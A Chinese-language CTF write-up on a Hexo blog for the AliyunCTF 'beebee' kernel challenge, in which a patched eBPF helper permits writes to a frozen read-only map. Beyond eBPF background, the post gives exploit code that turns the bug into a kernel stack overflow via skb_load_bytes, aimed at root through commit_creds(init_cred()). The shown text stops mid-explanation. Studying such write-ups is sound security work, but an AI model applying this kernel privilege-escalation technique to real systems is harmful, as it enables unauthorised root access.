@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="AliyunCTF–beebee一.背景介绍1.1 题目背景讲解​	通过对于题目解包之后可以看到了提供了patch，通过patch可以观察到这是一个通过bpf helper注册了一个bpf_aliyunctf_xor的函数，原理也很简单，将一个指针通过异或2025赋值给另一个指针，并且通过对应的type可以看出对于第二个指针指定的类型时read only，因此漏洞点就是在这里，可以将一个不可写的地">
+<meta property="og:type" content="article">
+<meta property="og:title" content="a2ure&#39;s blog">
+<meta property="og:url" content="http://example.com/2026/02/07/%E9%98%BF%E9%87%8C%E4%BA%91CTF--beebee/index.html">
+<meta property="og:site_name" content="a2ure&#39;s blog">
+<meta property="og:description" content="AliyunCTF–beebee一.背景介绍1.1 题目背景讲解​	通过对于题目解包之后可以看到了提供了patch，通过patch可以观察到这是一个通过bpf helper注册了一个bpf_aliyunctf_xor的函数，原理也很简单，将一个指针通过异或2025赋值给另一个指针，并且通过对应的type可以看出对于第二个指针指定的类型时read only，因此漏洞点就是在这里，可以将一个不可写的地">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/beebee/1740726989847.jpg">
+<meta property="og:image" content="http://example.com/images/beebee/1740739458259.jpg">
+<meta property="og:image" content="http://example.com/images/beebee/1740816536277.jpg">
+<meta property="og:image" content="http://example.com/images/beebee/1740817850319.jpg">
+<meta property="og:image" content="http://example.com/images/beebee/1740817881785.jpg">
+<meta property="article:published_time" content="2026-02-07T01:50:05.720Z">
+<meta property="article:modified_time" content="2026-02-07T01:50:05.721Z">
+<meta property="article:author" content="a2ure">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/beebee/1740726989847.jpg">
+
+<link rel="canonical" href="http://example.com/2026/02/07/%E9%98%BF%E9%87%8C%E4%BA%91CTF--beebee/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title> | a2ure's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">a2ure's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/02/07/%E9%98%BF%E9%87%8C%E4%BA%91CTF--beebee/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="a2ure">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="a2ure's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2026-02-07 09:50:05" itemprop="dateCreated datePublished" datetime="2026-02-07T09:50:05+08:00">2026-02-07</time>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>3.1k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>11 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="AliyunCTF–beebee"><a href="#AliyunCTF–beebee" class="headerlink" title="AliyunCTF–beebee"></a>AliyunCTF–beebee</h1><h2 id="一-背景介绍"><a href="#一-背景介绍" class="headerlink" title="一.背景介绍"></a>一.背景介绍</h2><h3 id="1-1-题目背景讲解"><a href="#1-1-题目背景讲解" class="headerlink" title="1.1 题目背景讲解"></a>1.1 题目背景讲解</h3><p>​	通过对于题目解包之后可以看到了提供了patch，通过patch可以观察到这是一个通过bpf helper注册了一个bpf_aliyunctf_xor的函数，原理也很简单，将一个指针通过异或2025赋值给另一个指针，并且通过对应的type可以看出对于第二个指针指定的类型时read only，因此漏洞点就是在这里，可以将一个不可写的地址进行写。因此接下来我们需要了解一下ebpf的原理。</p>
+<p><img src="/images/beebee/1740726989847.jpg" alt="1740726989847"></p>
+<h3 id="1-2-eBPF的背景知识"><a href="#1-2-eBPF的背景知识" class="headerlink" title="1.2 eBPF的背景知识"></a>1.2 eBPF的背景知识</h3><h4 id="1-2-1-eBPF汇编编程"><a href="#1-2-1-eBPF汇编编程" class="headerlink" title="1.2.1 eBPF汇编编程"></a>1.2.1 eBPF汇编编程</h4><p>​	eBPF（Extended Berkeley Packet Filter）是一种基于内核虚拟机的可编程技术，允许开发者通过在内核中安全运行<strong>沙盒化程序</strong>动态扩展内核功能，无需修改内核源码。其工作流程分为三个阶段：<strong>程序编写</strong>（可通过底层eBPF汇编指令或C等高级语言实现）、<strong>验证与加载</strong>（内核验证器确保代码安全无风险）、<strong>执行与交互</strong>（JIT编译后挂载至事件钩子，通过映射结构与用户态交互）。其中，eBPF汇编提供对指令级操作的<strong>精细控制</strong>，适合性能优化或特定场景突破；而高级语言（如C）通过编译器自动处理类型与边界检查，显著提升开发效率，更适合构建生产级工具（如网络监控、安全防御），两者在控制粒度与开发成本间形成互补。</p>
+<p>​	之后介绍一下对于ebpf中eBPF汇编指令的介绍，eBPF 由 11 个 64 位寄存器、一个程序计数器和一个 512 字节的大 BPF 堆栈空间组成。寄存器被命名为r0- r10。操作模式默认为 64 位。64位的寄存器也可作32 位子寄存器使用，它们只能通过特殊的 ALU（算术逻辑单元）操作访问，使用低32位，高32位使用零填充。</p>
+<p><img src="/images/beebee/1740739458259.jpg" alt="1740739458259"></p>
+<p>​	具体的指令格式如下：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">bpf_insn</span> &#123;</span><br><span class="line"> __u8 code;  <span class="comment">/* opcode */</span></span><br><span class="line"> __u8 dst_reg:<span class="number">4</span>; <span class="comment">/* dest register */</span></span><br><span class="line"> __u8 src_reg:<span class="number">4</span>; <span class="comment">/* source register */</span></span><br><span class="line"> __s16 off;  <span class="comment">/* signed offset */</span></span><br><span class="line"> __s32 imm;  <span class="comment">/* signed immediate constant */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>​	对于函数调用通过BPF_CALL指令调用内核预定义的辅助函数（如map_lookup_elem）或自定义函数（如BPF_FUNC_aliyunctf_xor），参数需按约定存入r1-r5寄存器，代码中通过BPF_RAW_INSN调用辅助函数实现数据查找和加解密操作。</p>
+<p><strong>1.2.2 高级语言实现eBPF编程</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bpf/bpf_helpers.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">SEC(<span class="string">&quot;tracepoint/syscalls/sys_enter_execve&quot;</span>)</span><br><span class="line"><span class="type">int</span> <span class="title function_">trace_execve</span><span class="params">(<span class="keyword">struct</span> bpf_sock_addr *ctx)</span> &#123;</span><br><span class="line">    <span class="type">char</span> msg[] = <span class="string">&quot;execve syscall triggered&quot;</span>;</span><br><span class="line">    bpf_trace_printk(msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span> _license[] SEC(<span class="string">&quot;license&quot;</span>) = <span class="string">&quot;GPL&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>​	一个C语言编写的eBPF程序开发流程通常遵循以下步骤（以用户提供的execve跟踪程序为例）：首先需要包含内核头文件（如linux&#x2F;bpf.h）和辅助函数库（如bpf&#x2F;bpf_helpers.h），通过SEC()宏定义程序挂载点（示例中为tracepoint&#x2F;syscalls&#x2F;sys_enter_execve），并在处理函数中实现核心逻辑——本例使用bpf_trace_printk()向内核调试日志输出触发信息，同时必须声明GPL许可证（char _license[]）以满足内核验证要求。该程序实现了对execve系统调用的动态监控功能，当进程执行新程序时，eBPF程序会被触发并记录事件。除系统调用跟踪外，eBPF还可实现网络包过滤（如XDP程序优化网络转发）、性能分析（通过BPF_PERF_OUTPUT映射实时统计CPU&#x2F;内存指标）、安全防护（如检测异常进程行为），以及容器环境下的资源监控（通过cgroup挂载点关联容器ID）。开发者还可结合BPF_MAP_TYPE_HASH等数据结构实现更复杂的状态跟踪，或通过kprobe&#x2F;uprobe挂钩内核&#x2F;用户空间函数进行深度分析。</p>
+<h3 id="1-3-sk-buff"><a href="#1-3-sk-buff" class="headerlink" title="1.3 sk_buff"></a>1.3 sk_buff</h3><p>​	题目栈溢出主要是通过利用BPF_FUNC_skb_load_bytes函数实现对于传入的skb包的内容转存到某片内存区域，因此我们需要了解一下这里的sk_buff，在linux的网络中有很重要的地位。下图展示了对应sk_buff中的存储数据指针信息。</p>
+<p><img src="/images/beebee/1740816536277.jpg" alt="1740816536277"></p>
+<ol>
+<li>sk_buff结构数据区刚被申请好，此时 head 指针、data 指针、tail 指针都是指向同一个地方。head 指针和 end 指针指向的位置一直都不变，而对于数据的变化和协议信息的添加都是通过 data 指针和 tail 指针的改变来表现的。</li>
+<li>开始准备存储应用层下发过来的数据，通过调用函数 skb_reserve() 来使 data 指针和 tail 指针同时向下移动，空出一部分空间来为后期添加协议信息。</li>
+<li>开始存储数据了，通过调用函数 skb_put() 来使 tail 指针向下移动空出空间来添加数据，此时 skb-&gt;data 和 skb-&gt;tail 之间存放的都是数据信息，无协议信息。</li>
+<li>这时就开始调用函数 skb_push() 来使 data 指针向上移动，空出空间来添加各层协议信息。直到最后到达二层，添加完帧头然后就开始发包了。</li>
+</ol>
+<p>​	因此对于上述来说我们通过伪造对应的data数据段就可以最终复制到我们指定的内存区域，但是在具体操作的时候会发现，在利用BPF_PROG_TYPE_SOCKET_FILTER的eBPF的prog_type时，利用BPF_PROG_TEST_RUN测试运行时的数据复制会在测试数据之前的0xe的大小开始复制，通过上述推测，应当是存储MAC的数据帧头包含源&#x2F;目的MAC地址和协议类型。此时对应的sk_buff的结构如下：</p>
+<p><img src="/images/beebee/1740817850319.jpg" alt="1740817850319"></p>
+<p><img src="/images/beebee/1740817881785.jpg" alt="1740817881785"></p>
+<p>​	因此通过观察可以发现协议部分一共有0x4e大小的内容，通过test.data_in可以模拟以太网数据包，从data数据前0xe大小的地址开始进行复制内存。</p>
+<h3 id="1-4-总结"><a href="#1-4-总结" class="headerlink" title="1.4 总结"></a>1.4 总结</h3><p>​	自此已经基本了解了eBPF可以实现那些功能并且了解到具体的原理，利用这些背景就可以实现后面的攻击利用了，主要就是通过利用对于只读的map进行写，构造出超出aBPF预期的行为，最终实现越界写，构造栈溢出，最终实现权限提升。</p>
+<h2 id="二-漏洞利用"><a href="#二-漏洞利用" class="headerlink" title="二. 漏洞利用"></a>二. 漏洞利用</h2><h3 id="2-1-题目环境解析"><a href="#2-1-题目环境解析" class="headerlink" title="2.1 题目环境解析"></a>2.1 题目环境解析</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64  \</span><br><span class="line">-m 512M  \</span><br><span class="line">-smp 2 \</span><br><span class="line">-kernel bzImage    \</span><br><span class="line">-append &quot;console=ttyS0 quiet panic=-1 nokaslr sysctl.kernel.io_uring_disabled=1 sysctl.kernel.dmesg_restrict=1 sysctl.kernel.kptr_restrict=2 sysctl.kernel.unprivileged_bpf_disabled=0&quot;     \</span><br><span class="line">-initrd rootfs.cpio \</span><br><span class="line">-drive file=./flag,if=virtio,format=raw,readonly=on \</span><br><span class="line">-nographic  \</span><br><span class="line">-net nic,model=e1000 \</span><br><span class="line">-no-reboot \</span><br><span class="line">-monitor /dev/null</span><br></pre></td></tr></table></figure>
+
+<p>​	根据上述启动脚本，我们可以看到并没有很多保护，并且也没有kalsr，因此只需要对于基地址进行rop就可以完成整个攻击流程。</p>
+<h3 id="2-2-初始化设置只读map"><a href="#2-2-初始化设置只读map" class="headerlink" title="2.2 初始化设置只读map"></a>2.2 初始化设置只读map</h3><p>​	首先观察漏洞我们可以发现，这里主要是通过对于只读的地址实现写的漏洞，因此最先就是创建一个只读的map，之后利用漏洞函数bpf_aliyunctf_xor，实现对于可读的内存覆盖，首先为了创建一个只读的地址区域，先创建了一个map。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;&#125;;</span><br><span class="line">    attr.map_type = BPF_MAP_TYPE_ARRAY;</span><br><span class="line">    attr.key_size = <span class="number">4</span>;</span><br><span class="line">    attr.value_size = <span class="number">8</span>;</span><br><span class="line">    attr.max_entries = <span class="number">1</span>;</span><br><span class="line">    attr.map_flags = BPF_F_RDONLY_PROG;</span><br><span class="line">    array_map_fd = SYSCHK(syscall(SYS_bpf, BPF_MAP_CREATE, &amp;attr, <span class="keyword">sizeof</span>(attr)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​	之后就是初始化这个map的内容</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> key = <span class="number">0</span>;</span><br><span class="line">        <span class="type">char</span> value[<span class="number">8</span>] = &#123;&#125;;</span><br><span class="line">        *(<span class="type">long</span> <span class="type">long</span>*)&amp;value[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;&#125;;</span><br><span class="line">        attr.map_fd = array_map_fd;</span><br><span class="line">        attr.key = (<span class="type">size_t</span>)&amp;key;</span><br><span class="line">        attr.value = (<span class="type">size_t</span>)&amp;value;</span><br><span class="line">        SYSCHK(syscall(SYS_bpf, BPF_MAP_UPDATE_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr)));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>​	之后就是讲这个map设置为只读的map</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;&#125;;</span><br><span class="line">    attr.map_fd = array_map_fd;</span><br><span class="line">    SYSCHK(syscall(SYS_bpf, BPF_MAP_FREEZE, &amp;attr, <span class="keyword">sizeof</span>(attr)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​	自此就已经完成了对于创建一个只读的map内存地址区域，之后就是需要利用这个只读的map创建一个非预期的数据内容（超出本身的预期值大小），最终利用这个内容调用bpf_skb_load_bytes函数，就可以实现出栈溢出的攻击。</p>
+<h3 id="2-3-通过漏洞设置非预期数值实现栈溢出攻击"><a href="#2-3-通过漏洞设置非预期数值实现栈溢出攻击" class="headerlink" title="2.3 通过漏洞设置非预期数值实现栈溢出攻击"></a>2.3 通过漏洞设置非预期数值实现栈溢出攻击</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">prog</span>[] =</span> &#123;</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_9, BPF_REG_1),   <span class="comment">// mov64 r9, r1 (保存上下文指针)</span></span><br><span class="line">    BPF_ST_MEM(BPF_DW, BPF_REG_10, <span class="number">-16</span>, <span class="number">0</span>),<span class="comment">// [fp-16]=0 (栈空间预置零)</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),  <span class="comment">// mov64 r2, fp</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">-16</span>),<span class="comment">// r2 -= 16 (计算map key地址)</span></span><br><span class="line">    BPF_LD_MAP_FD(BPF_REG_1, array_map_fd),<span class="comment">// r1 = map_fd (加载BPF map文件描述符)</span></span><br><span class="line">    BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_map_lookup_elem),<span class="comment">// map查找调用</span></span><br><span class="line">    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="number">0</span>, <span class="number">1</span>),<span class="comment">// if r0!=0 skip next (校验map查找结果)</span></span><br><span class="line">    BPF_EXIT_INSN(),                       <span class="comment">// exit (查找失败直接退出)[2](@ref)</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_3, BPF_REG_0),   <span class="comment">// mov64 r3, r0 (保存查找到的value指针)</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),   <span class="comment">// mov64 r7, r0 (备份value指针)</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_7, <span class="number">0</span>),<span class="comment">// r6 = [r7+0] (加载map存储值)</span></span><br><span class="line">    BPF_ST_MEM(BPF_W, BPF_REG_10, <span class="number">-0x18</span>, <span class="number">2025</span> ^ (<span class="number">0x80</span>)),<span class="comment">// [fp-24]=2025^0x80 (异或运算存储)</span></span><br><span class="line">    BPF_ST_MEM(BPF_W, BPF_REG_10, <span class="number">-0x14</span>, <span class="number">0</span>),<span class="comment">// [fp-20]=0 (栈空间初始化)</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_1, BPF_REG_10),  <span class="comment">// mov64 r1, fp</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, <span class="number">-0x18</span>),<span class="comment">// r1 -= 24 (计算异或参数地址)</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_2, <span class="number">8</span>),           <span class="comment">// mov64 r2, 8 (设置参数长度)</span></span><br><span class="line">    BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_aliyunctf_xor),<span class="comment">// 调用自定义异或函数</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),   <span class="comment">// mov64 r1, r9 (恢复上下文指针)</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_2, <span class="number">0</span>),           <span class="comment">// mov64 r2, 0 (设置偏移量)</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),  <span class="comment">// mov64 r3, fp</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, <span class="number">-8</span>), <span class="comment">// r3 -= 8 (计算存储地址)</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_4, BPF_REG_7, <span class="number">0</span>),<span class="comment">// r4 = [r7+0] (再次加载map值)</span></span><br><span class="line">    BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_skb_load_bytes),<span class="comment">// 加载数据包字节</span></span><br><span class="line">    BPF_EXIT_INSN()                        <span class="comment">// exit (程序退出)</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>​	首先就是利用上述的eBPF的汇编指令就可以实现上述效果，接下来分部进行解释，首先对于第一个指令主要时保存r1寄存器里面的值，由于时利用BPF_PROG_TYPE_SOCKET_FILTER的协议，因此r1中存储的就是后面调用skb_load_bytes需要存储信息的sk_buff结构体指针。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BPF_MOV64_REG(BPF_REG_9, BPF_REG_1),   <span class="comment">// mov64 r9, r1 (保存上下文指针)</span></span><br></pre></td></tr></table></figure>
+
+<p>​	之后利用下面这部分代码可以实现对于map_lookup_elem函数找到对应key的value指针，也就是后面希望修改只读区域的指针。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BPF_ST_MEM(BPF_DW, BPF_REG_10, <span class="number">-16</span>, <span class="number">0</span>),<span class="comment">// [fp-16]=0 (栈空间预置零)</span></span><br><span class="line">BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),  <span class="comment">// mov64 r2, fp</span></span><br><span class="line">BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">-16</span>),<span class="comment">// r2 -= 16 (计算map key地址)</span></span><br><span class="line">BPF_LD_MAP_FD(BPF_REG_1, array_map_fd),<span class="comment">// r1 = map_fd (加载BPF map文件描述符)</span></span><br><span class="line">BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_map_lookup_elem),<span class="comment">// map查找调用</span></span><br></pre></td></tr></table></figure>
+
+<p>​	接下来就是利用漏洞函数aliyunctf_xor实现对于非预期的数值构造，利用刚刚获得到的value指针，我们可以设置值为0x80也就是后面复制skb_load_bytes的字节数，按照可读进行预测，这里应该不会发生改变还是0但是由于存在漏洞导致编程0x80。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">BPF_MOV64_REG(BPF_REG_3, BPF_REG_0),   <span class="comment">// mov64 r3, r0 (保存查找到的value指针)</span></span><br><span class="line">   BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),   <span class="comment">// mov64 r7, r0 (备份value指针)</span></span><br><span class="line">   BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_7, <span class="number">0</span>),<span class="comment">// r6 = [r7+0] (加载map存储值)</span></span><br><span class="line">   BPF_ST_MEM(BPF_W, BPF_REG_10, <span class="number">-0x18</span>, <span class="number">2025</span> ^ (<span class="number">0x80</span>)),<span class="comment">// [fp-24]=2025^0x80 (异或运算存储)</span></span><br><span class="line">   BPF_ST_MEM(BPF_W, BPF_REG_10, <span class="number">-0x14</span>, <span class="number">0</span>),<span class="comment">// [fp-20]=0 (栈空间初始化)</span></span><br><span class="line">   BPF_MOV64_REG(BPF_REG_1, BPF_REG_10),  <span class="comment">// mov64 r1, fp</span></span><br><span class="line">   BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, <span class="number">-0x18</span>),<span class="comment">// r1 -= 24 (计算异或参数地址)</span></span><br><span class="line">   BPF_MOV64_IMM(BPF_REG_2, <span class="number">8</span>),           <span class="comment">// mov64 r2, 8 (设置参数长度)</span></span><br><span class="line">   BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_aliyunctf_xor),<span class="comment">// 调用自定义异或函数</span></span><br></pre></td></tr></table></figure>
+
+<p>​	最后就是调用skb_load_bytes把data复制到指定的内存区域，这里指定的地址时rbp - 8的地址，因此我们需要在之前说的MAC帧头0xe的基础上加上0x10大小的数据区域就可以控制最终的返回值，覆盖成commit_creds(init_cred())就可以实现权限提升了。</p>
